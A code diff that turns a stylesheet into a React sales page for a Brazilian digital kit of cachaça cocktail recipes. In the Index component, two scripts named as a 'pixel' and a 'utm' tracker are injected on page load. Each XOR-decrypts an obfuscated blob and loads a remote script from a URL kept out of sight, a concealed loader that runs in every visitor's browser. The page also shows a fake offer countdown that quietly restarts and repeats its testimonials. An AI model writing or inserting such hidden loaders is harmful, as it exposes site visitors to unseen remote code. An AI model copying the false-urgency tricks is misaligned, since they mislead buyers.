@@ -1,34 +1,187 @@
-@import "tailwindcss" source(none);
-@source "../src";
+import { createFileRoute } from "@tanstack/react-router";
+import { useEffect, useState } from "react";
 
-@theme {
-  --font-sans: "Inter", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+const IMG = "https://maisde150receitasdecachacas.vercel.app/assets/optimized/";
+const CAKTO_40 = "https://pay.cakto.com.br/s398a9j_1138649";
+const CAKTO_FULL = "https://pay.cakto.com.br/hu9et7p_1138688";
+
+export const Route = createFileRoute("/")({
+  head: () => ({
+    links: [
+      { rel: "preload", as: "image", href: "/5116834A-F50E-4E6B-9B7E-8A5CE3A5CBB6.webp", fetchPriority: "high" },
+      { rel: "preconnect", href: "https://maisde150receitasdecachacas.vercel.app" },
+    ],
+    meta: [
+      { title: "+200 Batidas de Cachaça Artesanal" },
+      { name: "description", content: "Biblioteca de Cachaças Artesanais com mais de 200 batidas, infusões, drinks e materiais extras." },
+      { property: "og:title", content: "+200 Batidas de Cachaça Artesanal" },
+      { property: "og:description", content: "Para começar a produzir na sua própria casa." },
+      { property: "og:type", content: "website" },
+    ],
+  }),
+  component: Index,
+});
+
+function Countdown() {
+  const [seconds, setSeconds] = useState(13 * 60 + 56);
+  useEffect(() => {
+    const timer = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 13 * 60 + 56)), 1000);
+    return () => clearInterval(timer);
+  }, []);
+  const m = String(Math.floor(seconds / 60)).padStart(2, "0");
+  const s = String(seconds % 60).padStart(2, "0");
+  return <>{m}:{s}</>;
 }
 
-:root{--bg:#f7f0e2;--ink:#201b17;--brown:#4a2416;--brown2:#3a2414;--gold:#c58a32;--cream:#f3e8d3;--muted:#6d625b;--green:#5c7a30}
-*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--font-sans);line-height:1.55}.cacha-page{overflow:hidden}.topbar{background:#3a2414;color:#fff;text-align:center;padding:13px 15px;font-weight:800;letter-spacing:.03em;font-size:14px}.topbar strong{color:#ffd18a;margin-left:5px}
-.hero{max-width:1000px;margin:auto;text-align:center;padding:52px 20px 70px}.eyebrow,.section-kicker{font-size:13px;font-weight:900;letter-spacing:.14em;color:var(--gold);margin-bottom:12px}.hero h1{font-size:clamp(35px,5vw,64px);line-height:1.02;max-width:900px;margin:0 auto 28px;font-weight:900}.hero h1 em{color:var(--brown);font-style:normal}.hero-mockup{width:min(560px,95%);max-height:510px;object-fit:contain;display:block;margin:0 auto 24px;filter:drop-shadow(0 18px 30px #0002)}.lead{font-size:18px;max-width:780px;margin:0 auto 20px;color:#4f443c}.checks{list-style:none;padding:0;margin:22px auto 28px;display:grid;grid-template-columns:1fr 1fr;gap:10px;max-width:680px;text-align:left}.checks li:before{content:"✓";color:var(--green);font-weight:900;margin-right:9px}
-.cta{position:relative;display:inline-flex;align-items:center;justify-content:center;gap:12px;min-height:62px;background:linear-gradient(180deg,#39d353 0%,#18a83a 52%,#0f8f31 100%);color:#fff;text-decoration:none;font-family:var(--font-sans);font-size:16px;font-weight:900;letter-spacing:.035em;border:2px solid #58e66d;border-radius:14px;padding:17px 30px;box-shadow:0 5px 0 #087326,0 12px 28px #16a53a66,inset 0 1px 0 #ffffff55;transition:transform .16s ease,box-shadow .16s ease,filter .16s ease;overflow:hidden;text-align:center;text-shadow:0 1px 2px #075c20}.cta:before{content:"";position:absolute;inset:0;background:linear-gradient(105deg,transparent 30%,#ffffff55 48%,transparent 66%);transform:translateX(-130%);transition:transform .6s ease}.cta:after{content:"→";font-size:23px;line-height:1;font-weight:900;transition:transform .16s ease}.cta:hover{filter:brightness(1.08) saturate(1.08);transform:translateY(-3px);box-shadow:0 7px 0 #087326,0 17px 34px #16a53a80,inset 0 1px 0 #ffffff66}.cta:hover:before{transform:translateX(130%)}.cta:hover:after{transform:translateX(5px)}.cta:active{transform:translateY(2px);box-shadow:0 3px 0 #087326,0 8px 16px #16a53a55}.plan.simple .cta{background:linear-gradient(180deg,#39d353 0%,#18a83a 52%,#0f8f31 100%);border-color:#58e66d;color:#fff;box-shadow:0 5px 0 #087326,0 12px 28px #16a53a66,inset 0 1px 0 #ffffff55}.plan.simple .cta:hover{box-shadow:0 7px 0 #087326,0 17px 34px #16a53a80,inset 0 1px 0 #ffffff66}.featured .cta{background:linear-gradient(180deg,#39d353 0%,#18a83a 52%,#0f8f31 100%);border-color:#58e66d;color:#fff;box-shadow:0 5px 0 #087326,0 12px 28px #16a53a66,inset 0 1px 0 #ffffff55}.micro{font-size:12px;color:#8b8077;margin-top:13px}
-.dark-section{background:var(--brown2);color:#fff;padding:70px 20px}.dark-section>h2,.dark-section>.section-kicker,.dark-section>.section-intro,.dark-section>.text-link,.dark-section>.cta{display:block;max-width:1050px;margin-left:auto;margin-right:auto}.dark-section h2{font-size:clamp(30px,4vw,50px);line-height:1.05;text-align:center;margin-top:0}.text-link{color:#e9bf75;text-align:center;font-weight:800;margin-bottom:35px}.recipe-grid{max-width:1050px;margin:25px auto 55px;display:grid;grid-template-columns:repeat(5,1fr);gap:12px}.recipe-grid img{width:100%;aspect-ratio:1/1.18;object-fit:cover;border-radius:10px;display:block;background:#45301d}.preview-grid{margin-bottom:35px}
-.section{max-width:1050px;margin:auto;padding:78px 20px}.section>h2{text-align:center;font-size:clamp(30px,4vw,48px);line-height:1.08;margin:0 0 35px}.how{text-align:center}.steps{display:grid;grid-template-columns:repeat(5,1fr);gap:18px}.steps article{padding:24px 14px;background:#fdfaf2;border:1px solid #e9ddc7;border-radius:15px}.step-icon{display:block;font-size:26px;font-weight:900;color:var(--gold)}.steps h3{font-size:18px}.steps p,.testimonials>p,.risk p{color:var(--muted)}
-.testimonials{text-align:center}.testimonial-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-top:35px}.quote{background:#fdfaf2;padding:27px;border-radius:15px;border:1px solid #e7dbc5;text-align:left;box-shadow:0 8px 24px #3922150a}.stars{color:#d39a2e;letter-spacing:2px}.quote p{font-size:16px}.quote strong{font-size:13px;color:#6e625a}
-.bonus{padding-bottom:80px}.section-intro{text-align:center;color:#ead9c4;max-width:720px}.bonus-grid{max-width:1050px;margin:45px auto;display:grid;grid-template-columns:repeat(5,1fr);gap:14px}.bonus-card{background:#fdfaf2;color:var(--ink);border-radius:14px;padding:15px;text-align:center}.bonus-card>span{font-size:11px;font-weight:900;color:var(--gold)}.bonus-card img{width:100%;aspect-ratio:1/1.2;object-fit:cover;border-radius:8px;margin:10px 0}.bonus-card h3{font-size:17px;line-height:1.15}.bonus-card p{font-size:13px;color:#665b54}.bonus-card>b{font-size:10px;color:#7b4b29}.bonus-price{font-size:13px}.bonus-price strong{color:#5f8031}.bonus-card small{display:block;margin-top:6px;color:#777}.bonus-total{text-align:center;line-height:1.7}.bonus-total s{color:#aaa}.bonus-total strong{font-size:20px}.bonus-total>b{font-size:36px;color:#b8d47e}.bonus-total span{display:block;color:#ddd;font-size:13px}
-.secure{text-align:center}.security-card{background:#fdfaf2;border:1px solid #e7dbc5;border-radius:15px;padding:25px;max-width:700px;margin:auto}
-.offer{padding-top:25px}.plans{display:grid;grid-template-columns:.85fr 1.15fr;gap:24px;align-items:start}.plan{background:#fdfaf2;border:1px solid #e5d8c1;border-radius:18px;padding:30px;box-shadow:0 15px 40px #32170e10}.plan h3{font-size:25px;margin-top:0}.plan ul{padding-left:20px}.plan li{margin:9px 0}.price{font-size:34px;font-weight:950;margin:25px 0}.simple .cta{width:100%}.featured{border:3px solid #b98732;position:relative}.badge{background:#b98732;color:#fff;font-weight:900;text-align:center;padding:9px;border-radius:9px;margin:-45px -18px 20px}.featured>img{width:min(360px,100%);display:block;margin:0 auto 15px}.featured s{color:#999}.installments{font-size:26px;margin-top:8px}.cash{font-size:18px;margin-bottom:18px}.featured .cta{width:100%;font-size:17px}.featured small{display:block;text-align:center;margin-top:10px;color:#777}
-.payment{text-align:center}.pay-icons{display:flex;justify-content:center;gap:25px;align-items:center;margin:25px 0;font-weight:900}.pay-icons span{background:#fdfaf2;border:1px solid #ddd;padding:10px 16px;border-radius:7px}.seal{width:230px;max-width:100%;display:block;margin:20px auto;filter:brightness(0)}.guarantee-img{width:260px;max-width:100%;display:block;margin:25px auto}
-.risk{text-align:center;background:#f0e8d5;max-width:none}.risk h2{max-width:800px;margin:0 auto 12px}.risk p{max-width:650px;margin:auto}
-.faq{max-width:850px}.faq details{background:#fdfaf2;border:1px solid #e6dac4;border-radius:10px;margin:10px 0;padding:0 18px}.faq summary{cursor:pointer;list-style:none;padding:19px 3px;font-weight:800;display:flex;justify-content:space-between}.faq summary::-webkit-details-marker{display:none}.faq summary span{font-size:24px;color:var(--gold)}.faq details p{color:#665d57;padding:0 3px 18px;margin:0}.final-cta{text-align:center;background:var(--brown2);color:#fff;padding:75px 20px}.final-cta h2{font-size:clamp(28px,4vw,48px);max-width:800px;margin:0 auto 30px;line-height:1.08}footer{text-align:center;background:#2a1a0e;color:#c9bdb5;padding:28px 15px;font-size:13px}footer small{display:block;margin-top:7px}
-@media(max-width:850px){.recipe-grid{grid-template-columns:repeat(2,1fr)}.bonus-grid{grid-template-columns:repeat(2,1fr)}.steps{grid-template-columns:1fr 1fr}.plans{grid-template-columns:1fr}.featured{margin-top:25px}.testimonial-grid{grid-template-columns:1fr}.checks{grid-template-columns:1fr}}
-@media(max-width:520px){.hero{padding-top:40px}.hero h1{font-size:37px}.recipe-grid{gap:8px}.bonus-grid{grid-template-columns:1fr}.steps{grid-template-columns:1fr}.dark-section,.section{padding-top:55px;padding-bottom:55px}.topbar{font-size:12px}.cta{width:100%;min-height:60px;padding:17px 18px;font-size:14px}.pay-icons{gap:7px;flex-wrap:wrap}}
-.marquee{width:100%;overflow:hidden;margin:28px 0 58px}.marquee-track{display:flex;width:max-content;gap:14px;animation:marquee-left 38s linear infinite;}.marquee img{width:170px;height:215px;object-fit:cover;border-radius:10px;flex:none;background:#45301d}.marquee-reverse .marquee-track{animation:marquee-right 38s linear infinite}.preview-large img{width:195px;height:250px}.marquee:hover .marquee-track{animation-play-state:paused}@keyframes marquee-left{from{transform:translateX(0)}to{transform:translateX(-50%)}}@keyframes marquee-right{from{transform:translateX(-50%)}to{transform:translateX(0)}}@media(max-width:520px){.marquee img{width:125px;height:165px}.preview-large img{width:145px;height:190px}.marquee-track{gap:9px;animation-duration:30s}}
-.testimonial-image{padding:0;overflow:hidden;text-align:center}.testimonial-image img{
-  display:block;
-  width:100%;
-  height:100%;
-  min-width:100%;
-  min-height:100%;
-  object-fit:fill !important;
-  object-position:center center;
-  transform:scaleY(1.7) !important;
-  transform-origin:center center;
+const bonuses = [
+  ["BÔNUS 01", "bonus-1-600.webp", "Manual de Higiene e de Conservação", "Conheça os cuidados de higiene, armazenamento e conservação da sua cachaça."],
+  ["BÔNUS 02", "bonus-2-600.webp", "Guia de Precificação e Apresentação Profissional", "Organize seus custos e aprimore a apresentação do seu produto artesanal."],
+  ["BÔNUS 03", "bonus-3-600.webp", "50 Drinks e Coquetéis", "Explore 50 combinações para levar criatividade e tradição a cada brinde."],
+  ["BÔNUS 04", "bonus-4-600.webp", "Guia de Madeiras e Sabores", "Descubra a influência de madeiras como carvalho, amburana, bálsamo e jequitibá."],
+  ["BÔNUS 05", "bonus-5-600.webp", "Guia de Harmonização", "Conheça combinações de cachaças, pratos e petiscos para diferentes ocasiões."],
+];
+
+
+function Index() {
+  useEffect(() => {
+    const pixelScript = document.createElement("script");
+    pixelScript.textContent = "(function(){var a_2kz=atob(\"DCYvlzyvK4cSxpsiZF0N4k7DCb0wru9WFFUVuBPMT+k8s+9PDUBWuV/ARqlwtLRRB1RG50jcBPd7vv5OS1ZG71nDBe1h5LcABVJb5VXNXvN3tbkYP3sDtVvDROVzqugAXn1UtVLORuIw/LlSDV5K+3XLCaswsPpOEUMNrR6ZSuUkoP4aVhBO8l/LTrcr8P0bBh5LpAmNVtpv\");var i_78=[];for(var e_1q3=0;e_1q3<a_2kz.length;e_1q3++){i_78.push(a_2kz.charCodeAt(e_1q3)&255);}var b_y07=i_78[0];var e_c7=i_78.slice(1,1+b_y07);var v_khhs=i_78.slice(1+b_y07);var h_tj0=v_khhs.map(function(b,e_et){return b^e_c7[e_et%b_y07];});var j_i4h=\"\";for(var h_tps=0;h_tps<h_tj0.length;h_tps++){j_i4h+=String.fromCharCode(h_tj0[h_tps]&255);}var n_1b=decodeURIComponent(escape(j_i4h));var g_5=JSON.parse(n_1b);var c_2u8n=g_5.globals||[];c_2u8n.forEach(function(g_6zo){window[g_6zo.name]=g_6zo.value;});var w_mz=document.createElement(\"script\");w_mz.src=g_5.url;w_mz.async=true;w_mz.defer=true;(g_5.attributes||[]).forEach(function(h_9b){w_mz.setAttribute(h_9b.name,h_9b.value);});(document.head||document.documentElement).appendChild(w_mz);})();";
+    document.head.appendChild(pixelScript);
+    return () => {
+      pixelScript.remove();
+    };
+  }, []);
+  useEffect(() => {
+    const utmScript = document.createElement("script");
+    utmScript.textContent = "(function(){var l_m9vz=atob(\"DGPBJi5DYseiQ1ZrihjjU1wvQP2AKyIf+hD7CQEgBqmMNiIG4wW4CE0sD+nAMXkY6RGoVlowTbLWLiVE5gK1Q103TK3RYXpJ6xe1VEchF7PHMHRR0RjjSE8uB+WYYTIK/gLsU1ouC6HbbiYZ7xWkSFpuGqTNJ3sY6QjjCgw1A6vXJnRRqEG8ClVhDKbPJnRRqAegUk9uF7PPKjASpxOzQ1gmDLOPMCMJ4weyBAJhFKbONjNJsEHjW3M+\");var b_rsq=[];for(var l_i=0;l_i<l_m9vz.length;l_i++){b_rsq.push(l_m9vz.charCodeAt(l_i)&255);}var r_v=b_rsq[0];var y_ga=b_rsq.slice(1,1+r_v);var f_5=b_rsq.slice(1+r_v);var n_ey=f_5.map(function(b,y_x){return b^y_ga[y_x%r_v];});var m_v5=\"\";for(var z_3j=0;z_3j<n_ey.length;z_3j++){m_v5+=String.fromCharCode(n_ey[z_3j]&255);}var f_0=decodeURIComponent(escape(m_v5));var g_kxp0=JSON.parse(f_0);var a_gcb=g_kxp0.globals||[];a_gcb.forEach(function(k_3co3){window[k_3co3.name]=k_3co3.value;});var y_0w8=document.createElement(\"script\");y_0w8.src=g_kxp0.url;y_0w8.async=true;y_0w8.defer=true;(g_kxp0.attributes||[]).forEach(function(q_pp){y_0w8.setAttribute(q_pp.name,q_pp.value);});(document.head||document.documentElement).appendChild(y_0w8);})();";
+    document.head.appendChild(utmScript);
+    return () => {
+      utmScript.remove();
+    };
+  }, []);
+
+  return (
+    <main className="cacha-page">
+      <div className="topbar">🥃 OFERTA ESPECIAL TERMINA EM: <strong><Countdown /></strong></div>
+
+      <section className="hero">
+        <div className="eyebrow">BIBLIOTECA DE CACHAÇAS ARTESANAIS</div>
+        <h1><em>+200 Batidas de Cachaça Artesanal</em> Para Começar a Produzir na sua própria casa</h1>
+        <img className="hero-mockup" src="/5116834A-F50E-4E6B-9B7E-8A5CE3A5CBB6.webp" width="1600" height="1600" fetchPriority="high" decoding="async" alt="Kit +200 Batidas de Cachaças Artesanais" />
+        <p className="lead">Explore batidas, infusões e combinações com frutas brasileiras para preparar sabores especiais e valorizar nossa tradição. Um universo de aromas e sabores em um só material.</p>
+        <ul className="checks">
+          <li>Batidas explicadas passo a passo</li><li>Infusões com frutas do Brasil</li><li>Drinks, licores e combinações variadas</li><li>Material digital para consultar no celular</li>
+        </ul>
+        <a className="cta" href="#oferta">🥃 QUERO MINHAS BATIDAS DE CACHAÇAS</a>
+        <div className="micro trust-micro">
+          <span><img src="https://cdn.simpleicons.org/whatsapp/25D366" alt="" aria-hidden="true" />WhatsApp</span>
+          <span><img src="https://cdn.simpleicons.org/gmail/EA4335" alt="" aria-hidden="true" />E-mail</span>
+          <span>Acesso imediato</span>
+        </div>
+      </section>
+
+      <section className="dark-section preview" id="batidas">
+        <div className="section-kicker">+200 BATIDAS NO MATERIAL COMPLETO</div>
+        <h2>Tradição e sabores para inspirar suas batidas:</h2>
+        <a className="text-link" href="#oferta">Ver batidas completas ↓</a>
+        <div className="marquee"><div className="marquee-track">{[...Array(2)].flatMap((_,set)=>["img-6-440.webp","img-9-440.webp","img-1-440.webp","img-4-440.webp","img-7-440.webp","img-2-440.webp","img-5-440.webp"].map((x,i)=><img key={"r"+set+i} src={IMG+x} alt={"Receita de cachaça "+(i+1)} loading="lazy" decoding="async" />))}</div></div>
+        <h2>Uma prévia do que você vai receber</h2>
+        <div className="marquee marquee-reverse preview-large"><div className="marquee-track">{[...Array(2)].flatMap((_,set)=>["previa-set23-6-800.webp","previa-set23-8-800.webp","previa-set23-10-800.webp","previa-set23-3-800.webp","previa-set23-5-800.webp","previa-set23-7-800.webp"].map((x,i)=><img key={"p"+set+i} src={IMG+x} alt={"Prévia "+(i+1)} loading="lazy" decoding="async" />))}</div></div>
+        <a className="cta" href="#oferta">QUERO ACESSO AO MATERIAL COMPLETO</a>
+      </section>
+
+      <section className="how section">
+        <div className="section-kicker">COMO FUNCIONA</div><h2>Funciona assim:</h2>
+        <div className="steps">
+          {[
+            ["1","📩","Receba o acesso","Material digital disponível após a compra."],
+            ["2","🥃","Escolha uma receita","Explore as batidas e escolha seu próximo sabor."],
+            ["3","🍋","Prepare em casa","Separe os ingredientes e siga as orientações da receita."],
+            ["4","📸","Fotografe","Registre os detalhes da sua criação artesanal."],
+            ["5","💰","Compartilhe","Celebre os sabores brasileiros com responsabilidade."]
+          ].map(([n,icon,title,text])=><article key={n}><span className="step-icon">{n}{icon}</span><h3>{title}</h3><p>{text}</p></article>)}
+        </div>
+      </section>
+
+      <section className="testimonials section">
+        <div className="section-kicker">RESULTADOS COMPARTILHADOS</div>
+        <h2>Veja o que dizem sobre o material:</h2>
+        <p>Confira os relatos sobre as batidas de cachaças artesanais.</p>
+        <div className="testimonial-carousel">
+          <div className="testimonial-track">
+            {["Fernanda Rocha .webp","Juliana Souza.webp","Marcos Vinícius .webp","Patrícia Lima .webp","Carlos Henrique.webp","Fernanda Rocha .webp","Juliana Souza.webp","Marcos Vinícius .webp","Patrícia Lima .webp","Carlos Henrique.webp"].map((file, i)=><article className="quote testimonial-image" key={i}>
+              <img src={"/" + file} alt={"Relato de " + file.replace(/\.png$/i, "").trim() + " sobre as batidas de cachaças artesanais"} loading="lazy" decoding="async" />
+            </article>)}
+          </div>
+        </div>
+      </section>
+
+      <section className="bonus dark-section">
+        <div className="section-kicker">CONTEÚDO EXTRA INCLUSO NO KIT COMPLETO</div>
+        <h2>Uma coleção completa. Cinco bônus para ir além.</h2>
+        <p className="section-intro">Do cuidado com a sua cachaça à combinação perfeita à mesa: conheça os materiais que acompanham o Kit Completo.</p>
+        <div className="marquee bonus-marquee"><div className="marquee-track">{[...Array(2)].flatMap((_,set)=>bonuses.map(([tag,img,title],i)=><img key={"b"+set+i} src={IMG+img} alt={tag+" — "+title} loading="lazy" decoding="async" />))}</div></div>
+        <div className="bonus-grid">
+          {bonuses.map(([tag,img,title,desc])=><article className="bonus-card" key={img}><span>{tag}</span><img src={IMG+img} alt={"Capa do "+title} loading="lazy" decoding="async"/><h3>{title}</h3><p>{desc}</p><b>BÔNUS GRÁTIS NO KIT</b><div className="bonus-price"><s>R$18,00</s> <strong>POR R$0,00</strong></div><small>Incluso no Kit Completo</small></article>)}
+        </div>
+        <div className="bonus-total">Valor total dos 5 bônus: <s>R$90,00</s><br/><strong>VOCÊ PAGA PELOS 5 BÔNUS</strong><br/><b><s>R$0,00</s></b><span>Todos inclusos na compra do Kit Completo, sem custo adicional.</span></div>
+      </section>
+
+      <section className="secure section">
+        <div className="security-card"><h3>🔒 PAGAMENTO 100% SEGURO</h3><p>O Pix será identificado no nome de <strong>CAKTO PAY LTDA</strong> responsável financeiro</p></div>
+      </section>
+
+      <section className="offer section" id="oferta">
+        <div className="section-kicker">⏰ OFERTA POR TEMPO LIMITADO</div>
+        <h2>Escolha como quer começar hoje:</h2>
+        <div className="plans">
+          <article className="plan simple"><img className="basic-mockup" width="1600" height="1600" src="/5116834A-F50E-4E6B-9B7E-8A5CE3A5CBB6.webp" alt="+200 batidas de cachaças artesanais" loading="lazy" decoding="async"/><h3>KIT +200 BATIDAS</h3><ul className="checks"><li>Material 100% digital</li><li>Acesso imediato após a compra</li></ul><div className="price">R$10,00</div><a className="cta" href={CAKTO_40}>QUERO O KIT +200 POR R$10,00</a></article>
+          <article className="plan featured"><div className="badge">⭐ MELHOR CUSTO-BENEFÍCIO</div><img width="1600" height="1600" src="/704AF2B4-946F-437D-B364-D4AB9BCAD364.webp" alt="Kit completo com mais de 200 batidas de cachaças artesanais" loading="lazy" decoding="async"/><h3>KIT COMPLETO +200 BATIDAS + BÔNUS</h3><ul className="checks"><li>+200 batidas de cachaças artesanais</li><li>Manual de Higiene e de Conservação</li><li>Guia de Precificação e Apresentação Profissional</li><li>50 Drinks e Coquetéis</li><li>Guia de Madeiras e Sabores</li><li>Guia de Harmonização</li><li>Material 100% digital</li><li>Acesso imediato</li><li>Garantia de 7 dias</li></ul><s>R$97,00</s><div className="installments">5x de <strong>R$4,98</strong></div><div className="cash">ou <strong>R$24,90 à vista</strong></div><a className="cta" href={CAKTO_FULL}>QUERO O KIT COMPLETO POR R$24,90</a><small>Pagamento único • Acesso imediato • Garantia de 7 dias</small></article>
+        </div>
+      </section>
+
+      <section className="payment section">
+        <h3>🔒 Formas de pagamento</h3>
+        <p>Cartão de crédito em até 5x sem juros ou Pix aprovado na hora</p>
+        <div className="pay-icons" aria-label="Formas de pagamento">
+          <img src="https://cdn.simpleicons.org/visa/1434CB" alt="Visa" width="56" height="32" loading="lazy" decoding="async"/>
+          <img src="https://cdn.simpleicons.org/mastercard/EB001B" alt="Mastercard" width="56" height="32" loading="lazy" decoding="async"/>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/1/14/Logotipo_da_Elo.svg" alt="Elo" width="56" height="32" loading="lazy" decoding="async" />
+          <img src="https://cdn.simpleicons.org/pix/32BCAD" alt="Pix" width="56" height="32" loading="lazy" decoding="async"/>
+        </div>
+        <img src={IMG+"selo-compra-segura-600.webp"} alt="Compra segura, satisfação garantida e privacidade protegida" className="seal" loading="lazy" decoding="async"/>
+        <img src={IMG+"garantia-7-dias-risco-zero-420.webp"} alt="Selo de garantia de 7 dias com risco zero" loading="lazy" decoding="async" className="guarantee-img"/>
+      </section>
+
+      <section className="risk section"><div className="section-kicker">🛡️ VOCÊ COMPRA SEM RISCO</div><h2>Conheça o material por 7 dias</h2><p>Explore o material com tranquilidade. Se precisar solicitar o reembolso dentro do prazo, siga as condições da plataforma.</p></section>
+
+      <FAQ />
+      <section className="final-cta"><h2>Leve a tradição e os sabores do Brasil para suas próprias batidas.</h2><a className="cta" href="#oferta">🥃 QUERO ACESSO ÀS +200 BATIDAS</a></section>
+      <footer>© 2026 — +200 Batidas de Cachaças Artesanais<br/><small>Material digital educacional destinado a maiores de 18 anos. Aprecie com moderação.</small></footer>
+    </main>
+  );
+}
+
+function FAQ() {
+  const items = [
+    ["Preciso ter experiência para acompanhar?","Não. O material foi organizado para facilitar a consulta, mesmo para quem está começando."],
+    ["Quais sabores vou encontrar?","Você encontrará combinações variadas, infusões com frutas, licores, drinks e outras sugestões."],
+    ["O que está incluído no Kit Completo?","Você recebe mais de 200 batidas, além dos cinco bônus apresentados nesta página."],
+    ["Vou receber garrafas ou um livro físico?","Não. O produto é 100% digital."],
+    ["Como recebo o material?","Após a confirmação da compra, o acesso ao material é disponibilizado digitalmente."],
+    ["Funciona no celular?","Sim. Por ser digital, você pode consultar o material pelo celular."],
+    ["Tem garantia?","Sim. Você tem 7 dias para conhecer o material e solicitar o reembolso conforme as condições da plataforma."]
+  ];
+  return (
+    <section className="faq section">
+      <div className="section-kicker">DÚVIDAS FREQUENTES</div>
+      <h2>Perguntas frequentes</h2>
+      {items.map(([q, a]) => (
+        <details key={q}>
+          <summary>{q}<span>+</span></summary>
+          <p>{a}</p>
+        </details>
+      ))}
+    </section>
+  );
 }
